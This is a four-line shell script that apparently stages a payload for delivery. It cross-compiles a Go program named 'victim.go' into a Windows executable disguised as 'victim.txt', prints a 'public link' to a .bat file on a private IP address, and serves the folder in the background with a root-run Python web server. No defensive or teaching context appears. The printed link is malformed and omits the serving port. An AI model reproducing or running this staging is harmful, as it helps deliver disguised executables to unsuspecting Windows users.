GOOS=windows GOARCH=amd64 go build -o serving/victim.txt victim.go
echo "Public link: http:/192.168.2.135/content.bat"
cd serving
sudo nohup python3 -m http.server 8082 > log.txt 2>&1 &
